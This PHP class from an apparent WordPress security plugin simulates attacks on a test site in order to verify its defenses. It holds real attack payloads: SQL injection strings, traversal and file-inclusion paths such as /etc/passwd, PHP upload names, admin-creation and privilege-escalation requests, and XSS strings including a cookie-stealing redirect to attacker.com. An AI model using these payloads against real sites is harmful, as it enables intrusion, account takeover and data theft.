<?php
if (!defined('ABSPATH')) exit;
if (!class_exists('VulnerabilitySimulator')) :
	class VulnerabilitySimulator {

		private static $request_signature = null;
		private static $request_secret_key = null;
		private static $test_site_url = null;

		public static function setRequestSecretKey($site_key) {
			self::$request_secret_key = $site_key;
		}

		public static function setRequestSignature($vuln_id) {
			$sig = WPRadarHelper::get_signature($vuln_id, self::$request_secret_key);
			self::$request_signature = $sig;
		}

		public static function setTestSiteUrl($site_url) {
			self::$test_site_url = $site_url;
		}

		public static function setBaseRequestVariables($target_url, $site_key, $vuln_id) {
			self::setTestSiteUrl($target_url);
			self::setRequestSecretKey($site_key);
			self::setRequestSignature($vuln_id);
			return true;
		}

		public static function vulnerabilityList() {
			// these names corresponds to the function name. Please change accordingly.
			return array(
				array("id" => "wp_radar_sql_injection_test_1", "name" => "SQL Injection Test 1", "description" => "Evaluates the resistance to unauthorized SQL queries through user inputs", "example" => "Paid Memberships Pro < 2.9.8"),
				array("id" => "wp_radar_sql_injection_test_2", "name" => "SQL Injection Test 2", "description" => "Evaluates the resistance to unauthorized SQL queries through user inputs", "example" => "Paid Memberships Pro < 2.9.8"),
				array("id" => "wp_radar_sql_injection_test_3", "name" => "SQL Injection Test 3", "description" => "Evaluates the resistance to unauthorized SQL queries through user inputs", "example" => "Paid Memberships Pro < 2.9.8"),
				array("id" => "wp_radar_sql_injection_test_4", "name" => "SQL Injection Test 4", "description" => "Evaluates the resistance to unauthorized Boolean based blind SQL queries through user inputs", "example" => "Paid Memberships Pro < 2.9.8"),
				array("id" => "wp_radar_sql_injection_test_5", "name" => "SQL Injection Test 5", "description" => "Evaluates the resistance to unauthorized SQL queries through user inputs", "example" => "Paid Memberships Pro < 2.9.8"),
				array("id" => "wp_radar_essential_addon_psswd_reset_test", "name" => "Password Reset Test 1", "description" => "Assesses the security of the password reset functionality to prevent unauthorized access.", "example" => "WP User Control <= 1.5.3"),
				array("id" => "wp_radar_update_option_test_1", "name" => "Update Option Test 1", "description" => "Verifies the ability to securely update WordPress option table to prevent unauthorized changes.", "example" => "Login/Signup Popup <= 2.2, Side Cart Woocommerce <= 2.0"),
				array("id" => "wp_radar_update_option_test_2", "name" => "Update Option Test 2", "description" => "Verifies the ability to securely update WordPress option table to prevent unauthorized changes.", "example" => "Login/Signup Popup <= 2.2, Side Cart Woocommerce <= 2.0"),
				array("id" => "wp_radar_update_option_test_3", "name" => "Update Option Test 3", "description" => "Verifies the ability to securely update WordPress option table to prevent unauthorized changes.", "example" => "Login/Signup Popup <= 2.2, Side Cart Woocommerce <= 2.0"),
				array("id" => "wp_radar_update_option_test_4", "name" => "Update Option Test 4", "description" => "Verifies the ability to securely update WordPress option table to prevent unauthorized changes.", "example" => "Login/Signup Popup <= 2.2, Side Cart Woocommerce <= 2.0"),
				array("id" => "wp_radar_directory_traversal_test_1", "name" => "Directory Traversal Test 1", "description" => "Ensures the website's protection to access files and directories that are stored outside the web root folder.", "example" => "Shortcodes Ultimate <= 4.9.9, WordPress File Upload < 4.13.0"),
				array("id" => "wp_radar_directory_traversal_test_2", "name" => "Directory Traversal Test 2", "description" => "Ensures the website's protection to access files and directories that are stored outside the web root folder.", "example" => "Shortcodes Ultimate <= 4.9.9, WordPress File Upload < 4.13.0"),
				array("id" => "wp_radar_directory_traversal_test_3", "name" => "Directory Traversal Test 3", "description" => "Ensures the website's protection to access files and directories that are stored outside the web root folder.", "example" => "Shortcodes Ultimate <= 4.9.9, WordPress File Upload < 4.13.0"),
				array("id" => "wp_radar_file_inclusion_test_1", "name" => "File Inclusion Test 1", "description" => "Evaluates the site's defenses against accessing file on the site.", "example" => "Tutor LMS < 1.8.8"),
				array("id" => "wp_radar_file_inclusion_test_2", "name" => "File Inclusion Test 2", "description" => "Evaluates the site's defenses against accessing file on the site.", "example" => "Tutor LMS < 1.8.8"),
				array("id" => "wp_radar_file_upload_test_1", "name" => "File Upload Test 1", "description" => "Assesses the security to prevent unauthorized file uploads that could lead to malicious activities.", "example" => "Contact Form 7 < 5.3.2"),
				array("id" => "wp_radar_file_upload_test_2", "name" => "File Upload Test 2", "description" => "Assesses the security to prevent unauthorized file uploads that could lead to malicious activities.", "example" => "Contact Form 7 < 5.3.2"),
				array("id" => "wp_radar_file_upload_test_3", "name" => "File Upload Test 3", "description" => "Assesses the security to prevent unauthorized file uploads that could lead to malicious activities.", "example" => "Contact Form 7 < 5.3.2"),
				array("id" => "wp_radar_file_upload_test_4", "name" => "File Upload Test 4", "description" => "Assesses the security to prevent unauthorized file uploads that could lead to malicious activities.", "example" => "Contact Form 7 < 5.3.2"),
				array("id" => "wp_radar_add_option_test_1", "name" => "Add Option Test 1", "description" => "Tries to add an option", "example" => "WordPress Automatic < 3.53.3"),
				array("id" => "wp_radar_delete_option_test_1", "name" => "Delete Option Test 1", "description" => "Tries to delete an option", "example" => "DPD baltic < 1.2.57"),
				array("id" => "wp_radar_delete_option_test_2", "name" => "Delete Option Test 2", "description" => "Tries to delete an option", "example" => "DPD baltic < 1.2.57"),
				array("id" => "wp_radar_delete_option_test_3", "name" => "Delete Option Test 3", "description" => "Tries to delete an option", "example" => "DPD baltic < 1.2.57"),
				array("id" => "wp_radar_create_user_test_1", "name" => "Create User Test 1", "description" => "Tries to create a user", "example" => "uListing <= 1.6.6, MasterStudy LMS < 2.7.6"),
				array("id" => "wp_radar_create_user_test_2", "name" => "Create User Test 2", "description" => "Tries to create a user", "example" => "uListing <= 1.6.6, MasterStudy LMS < 2.7.6"),
				array("id" => "wp_radar_delete_user_test_1", "name" => "Delete User Test 1", "description" => "Tries to delete a user", "example" => "Mail Subscribe List < 2.1.4"),
				array("id" => "wp_radar_delete_user_test_2", "name" => "Delete User Test 2", "description" => "Tries to delete a user", "example" => "Mail Subscribe List < 2.1.4"),
				array("id" => "wp_radar_update_user_test_1", "name" => "Update User Test 1", "description" => "Tries to update a user", "example" => "Directorist < 7.4.2.2, User Role Editor <= 4.24"),
                                array("id" => "wp_radar_update_user_test_2", "name" => "Update User Test 2", "description" => "Tries to update a user", "example" => "Directorist < 7.4.2.2, User Role Editor <= 4.24"),
				array("id" => "wp_radar_delete_post_test_1", "name" => "Delete Post Test 1", "description" => "Tries to update a post", "example" => "WP Google Map <= 1.8.3"),
				array("id" => "wp_radar_update_user_meta_test_1", "name" => "Update User Meta Test 1", "description" => "Tries to update user meta", "example" => "Ultimate Member <= 2.6.6"),
				array("id" => "wp_radar_update_user_meta_test_2", "name" => "Update User Meta Test 2", "description" => "Tries to update user meta", "example" => "Ultimate Member <= 2.6.6"),
				array("id" => "wp_radar_add_user_meta_test_1", "name" => "Add User Meta Test 1", "description" => "Tries to add user meta", "example" => "ACF Photo Gallery Field <= 1.9"),
				array("id" => "wp_radar_cross_site_scripting_test_1", "name" => "Cross Site Scripting Test 1", "description" => "Tries to inject script", "example" => "Contact Form Email < 1.3.38"),
				array("id" => "wp_radar_cross_site_scripting_test_2", "name" => "Cross Site Scripting Test 2", "description" => "Tries to inject script", "example" => "Contact Form Email < 1.3.38"),
				array("id" => "wp_radar_cross_site_scripting_test_3", "name" => "Cross Site Scripting Test 3", "description" => "Tries to inject script", "example" => "Contact Form Email < 1.3.38"),
				array("id" => "wp_radar_cross_site_scripting_test_4", "name" => "Cross Site Scripting Test 4", "description" => "Tries to inject script", "example" => "Contact Form Email < 1.3.38"),
			);
		}

		public static function simulate($vuln_id, $target_url, $site_key) {
			$target_url = base64_decode($target_url);
			self::setBaseRequestVariables($target_url, $site_key, $vuln_id);

			$resp = null;
			switch($vuln_id) {
			case 'wp_radar_sql_injection_test_1':
				$query = 'union select id from hacktable';
				$resp = self::wp_radar_sql_injection_test($query);
				break;
			case 'wp_radar_sql_injection_test_2':
				$query = "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')) from hacktable";
				$resp = self::wp_radar_sql_injection_test($query);
				break;
			case 'wp_radar_sql_injection_test_3':
				$query = 'select * from wp_options';
				$resp = self::wp_radar_sql_injection_test($query);
				break;
			case 'wp_radar_sql_injection_test_4':
				$query = "'2' and 1=2 --";
				$resp = self::wp_radar_sql_injection_test($query);
				break;
			case 'wp_radar_sql_injection_test_5':
				$query = 'select post_status from wp_posts where ID=1';
				$resp = self::wp_radar_sql_injection_test($query);
				break;
			case 'wp_radar_essential_addon_psswd_reset_test':
				$resp = self::wp_radar_essential_addon_psswd_reset_test(true);
				break;
			case 'wp_radar_update_option_test_1':
				$option_name = 'blogname';
				$option_value = WordpressOpsHelper::getRandomString(6);
				$resp = self::wp_radar_update_option_test($option_name, $option_value, true);
				break;
			case 'wp_radar_update_option_test_2':
				$option_name = 'blogdescription';
				$option_value = WordpressOpsHelper::getRandomString(20);
				$resp = self::wp_radar_update_option_test($option_name, $option_value, true);
				break;
			case 'wp_radar_update_option_test_3':
				$option_name = 'siteurl';
				$option_value = 'https://' . WordpressOpsHelper::getRandomString(6) . '.net';
				$resp = self::wp_radar_update_option_test($option_name, $option_value, true);
				break;
			case 'wp_radar_update_option_test_4':
				$option_name = 'bvAccountsList';
				$option_value = WordpressOpsHelper::getRandomString(6);
				$resp = self::wp_radar_update_option_test($option_name, $option_value, true);
				break;
			case 'wp_radar_directory_traversal_test_1':
				$path = "../";
				$resp = self::wp_radar_directory_traversal_test($path, true);
				break;
			case 'wp_radar_directory_traversal_test_2':
				$path = "../../../";
				$resp = self::wp_radar_directory_traversal_test($path, true);
				break;
			case 'wp_radar_directory_traversal_test_3':
				$path = "../../";
				$resp = self::wp_radar_directory_traversal_test($path, true);
				break;
			case 'wp_radar_file_inclusion_test_1':
				$path = "./wp-config.php";
				$resp = self::wp_radar_file_inclusion_test($path, true);
				break;
			case 'wp_radar_file_inclusion_test_2':
				$path = "/etc/passwd";
				$resp = self::wp_radar_file_inclusion_test($path, true);
				break;
			case 'wp_radar_file_upload_test_1':
				$name = WordpressOpsHelper::getRandomString(6) . ".php";
				$content = "<?php echo 'Hello World'; ?>";
				$resp = self::wp_radar_file_upload_test($name, $content);
				break;
			case 'wp_radar_file_upload_test_2':
				$name = WordpressOpsHelper::getRandomString(6) . ".jpg.php";
				$content = "<?php echo 'Hello World'; ?>";
				$resp = self::wp_radar_file_upload_test($name, $content);
				break;
			case 'wp_radar_file_upload_test_3':
				$name = WordpressOpsHelper::getRandomString(6) . ".phtml";
				$content = "<?php echo 'Hello World'; ?>";
				$resp = self::wp_radar_file_upload_test($name, $content);
				break;
			case 'wp_radar_file_upload_test_4':
				$name = WordpressOpsHelper::getRandomString(6) . ".php5";
				$content = "<?php echo 'Hello World'; ?>";
				$resp = self::wp_radar_file_upload_test($name, $content);
				break;
			case 'wp_radar_add_option_test_1':
				$option_name = 'option1';
				$option_value = WordpressOpsHelper::getRandomString(6);
				$resp = self::wp_radar_add_option_test($option_name, $option_value, true);
				break;
			case 'wp_radar_delete_option_test_1':
				$option_name = 'siteurl';
				$resp = self::wp_radar_delete_option_test($option_name, true);
				break;
			case 'wp_radar_delete_option_test_2':
				$option_name = 'default_role';
				$resp = self::wp_radar_delete_option_test($option_name, true);
				break;
			case 'wp_radar_delete_option_test_3':
				$option_name = 'home';
				$resp = self::wp_radar_delete_option_test($option_name, true);
				break;
			case 'wp_radar_create_user_test_1':
				$user_login = WordpressOpsHelper::getRandomString(10);
				$user_pass = WordpressOpsHelper::getRandomString(10);
				$user_email = WordpressOpsHelper::getRandomString(6).'@gmail.com';
				$role = 'editor';
				$user_data = array('user_login' => $user_login, 'user_pass' => $user_pass, 'user_email' => $user_email, 'role' => $role);
				$resp  = self::wp_radar_create_user_test($user_data, true);
				break;
			case 'wp_radar_create_user_test_2':
				$user_login = WordpressOpsHelper::getRandomString(10);
				$user_pass = WordpressOpsHelper::getRandomString(10);
				$user_email = WordpressOpsHelper::getRandomString(6).'@gmail.com';
				$role = 'administrator';
				$user_data = array('user_login' => $user_login, 'user_pass' => $user_pass, 'user_email' => $user_email, 'role' => $role);
				$resp  = self::wp_radar_create_user_test($user_data, true);
				break;
			case 'wp_radar_delete_user_test_1':
				$user_id = 1;
				$resp = self::wp_radar_delete_user_test($user_id);
				break;
			case 'wp_radar_delete_user_test_2':
				$user_id = 2;
				$resp = self::wp_radar_delete_user_test($user_id);
				break;
			case 'wp_radar_update_user_test_1':
				$user_email = WordpressOpsHelper::getRandomString(6).'@gmail.com';
				$user_data = array('id' => 1, 'user_email' => $user_email);
				$resp =  self::wp_radar_update_user_test($user_data);
				break;
			case 'wp_radar_update_user_test_2':
				$user_pass = WordpressOpsHelper::getRandomString(10);
				$user_data = array('id' => 1, 'user_pass' => $user_pass);
				$resp = self::wp_radar_update_user_test($user_data);
				break;
			case 'wp_radar_delete_post_test_1':
				$post_id = 1;
				$resp = self::wp_radar_delete_post_test($post_id);
				break;
			case 'wp_radar_update_user_meta_test_1':
				$user_id = 1;
				$meta_key = 'role';
				$meta_value = 'editor';
				$resp = self::wp_radar_update_user_meta_test($user_id, $meta_key, $meta_value, true);
				break;
			case 'wp_radar_update_user_meta_test_2':
				$user_id = 1;
				$meta_key = 'role';
				$meta_value = 'administrator';
				$resp = self::wp_radar_update_user_meta_test($user_id, $meta_key, $meta_value, true);
				break;
			case 'wp_radar_add_user_meta_test_1':
				$user_id = 1;
				$meta_key = 'wp_capabilities';
				$meta_value = array('administrator' => 1);
				$resp = self::wp_radar_add_user_meta_test($user_id, $meta_key, $meta_value, true);
				break;
			case 'wp_radar_cross_site_scripting_test_1':
				$cmd = "<script>alert('1');</script>";
				$resp = self::wp_radar_cross_site_scripting_test($cmd, true);
				break;
			case 'wp_radar_cross_site_scripting_test_2':
				$cmd = "<img src=\"https://attacker.com/evil\" onerror=\"alert('XSS')\">";
				$resp = self::wp_radar_cross_site_scripting_test($cmd, true);
				break;
			case 'wp_radar_cross_site_scripting_test_3':
				$cmd = "<a href=\"javascript:alert('XSS')\">Click me</a>";
				$resp = self::wp_radar_cross_site_scripting_test($cmd, true);
				break;
			case 'wp_radar_cross_site_scripting_test_4':
				$cmd = "<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>";
				$resp = self::wp_radar_cross_site_scripting_test($cmd, true);
				break;
			default:
				break;
			}

			self::handleResponse($resp);
		}

		public static function handleResponse($resp) {
			if ($resp) {
				http_response_code($resp['resp_code']);
				die($resp['resp_body']);
			} else {
				http_response_code(422);
				die("Some error occured.");
			}
		}

		public static function wp_radar_sql_injection_test($query) {
			$post_params = array('query' => $query);
			return self::sendRequest('POST', $post_params);
		}

		public static function wp_radar_directory_traversal_test($path, $is_rand) {
			$post_params = array('path' => $path);
			return self::sendRequest('POST', $post_params, array(), $is_rand);
		}

		public static function wp_radar_file_inclusion_test($path, $is_rand) {
			$post_params = array('path' => $path);
			return self::sendRequest('POST', $post_params, array(), $is_rand);
		}

		public static function wp_radar_file_upload_test($name, $content) {
			$response = HttpRequestSender::uploadFile(self::$test_site_url . "/wp-load.php", $name, $content);
			if ($response === false) {
				return array('resp_body' => "", 'resp_code' => 422);
			} else {
				return $response;
			}
		}

		public static function wp_radar_update_option_test($option_name, $option_value, $is_rand) {
			$post_params = array('option_name' => $option_name, 'option_value' => $option_value);
			return self::sendRequest('POST', $post_params, array(), $is_rand);
		}

		public static function wp_radar_essential_addon_psswd_reset_test($is_rand) {
			$post_params = array('rp_login' => WordpressOpsHelper::getRandomString(6));
			return self::sendRequest('POST', $post_params, array(), $is_rand);
		}

		public static function wp_radar_add_option_test($option_name, $option_value, $is_rand) {
			$post_params = array('option_name' => $option_name, 'option_value' => $option_value);
			return self::sendRequest('POST', $post_params, array(), $is_rand);
		}

		public static function wp_radar_delete_option_test($option_name, $is_rand) {
			$post_params = array('option_name' => $option_name);
			return self::sendRequest('POST', $post_params, array(), $is_rand);
		}

		public static function wp_radar_create_user_test($user_data, $is_rand) {
			$post_params = $user_data;
			return self::sendRequest('POST', $post_params, array(), $is_rand);
		}

		public static function wp_radar_delete_user_test($user_id) {
			$post_params = array('id' => $user_id);
			return self::sendRequest('POST', $post_params);
		}

		public static function wp_radar_update_user_test($user_data, $is_rand = false) {
			$post_params = $user_data;
			return self::sendRequest('POST', $post_params, array(), $is_rand);
		}

		public static function wp_radar_delete_post_test($post_id) {
			$post_params = array('id' => $post_id);
			return self::sendRequest('POST', $post_params);
		}

		public static function wp_radar_update_user_meta_test($user_id, $meta_key, $meta_value, $is_rand) {
			$post_params = array('id' => $user_id, 'meta_key' => $meta_key, 'meta_value' => $meta_value);
			return self::sendRequest('POST', $post_params, array(), $is_rand);
		}

		public static function wp_radar_add_user_meta_test($user_id, $meta_key, $meta_value, $is_rand) {
			$post_params = array('id' => $user_id, 'meta_key' => $meta_key, 'meta_value' => $meta_value);
			return self::sendRequest('POST', $post_params, array(), $is_rand);
		}

		public static function wp_radar_cross_site_scripting_test($cmd, $is_rand) {
			$post_params = array('cmd' => $cmd);
			return self::sendRequest('POST', $post_params, array(), $is_rand);
		}

		public static function sendRequest($req_type, $post_params = null, $query_params = array(), $is_rand = false) {
			$query_params['sig'] = self::$request_signature;
			if ($is_rand == true && $post_params && is_array($post_params)) {
				$query_params['is_rand'] = 1;
				$post_params = WPRadarHelper::randomize_params(self::$request_secret_key, $post_params);
			}
			return HttpRequestSender::request(self::$test_site_url, $query_params, $req_type, array('params' => $post_params));
		}
	}
endif;
?>
